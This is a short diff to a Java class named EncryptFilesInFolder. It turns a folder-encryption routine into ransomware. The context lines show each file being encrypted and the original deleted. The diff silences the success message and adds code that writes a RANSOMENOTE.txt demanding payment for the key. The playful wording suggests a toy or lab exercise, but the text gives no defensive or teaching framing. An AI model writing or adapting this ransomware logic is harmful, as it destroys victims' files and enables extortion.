@@ -65,12 +65,17 @@ public class EncryptFilesInFolder {
 
                     // Remove the original file after encryption
                     file.delete();
-                    System.out.println("Encrypted and removed: " + file.getAbsolutePath());
+
+                    //System.out.println("Encrypted and removed: " + file.getAbsolutePath());
                 } catch (Exception e) {
                     System.err.println("Error encrypting file " + file.getAbsolutePath() + ": " + e.getMessage());
                 }
             }
         }
+        // Add ransome note
+        FileWriter ransomWriter = new FileWriter(folderPath + "/RANSOMENOTE.txt");
+        ransomWriter.write("All files in this folder have been encrypted. Pay a million buckaroos to get the key!");
+        ransomWriter.close();
     }
 
     public static void main(String[] args) {
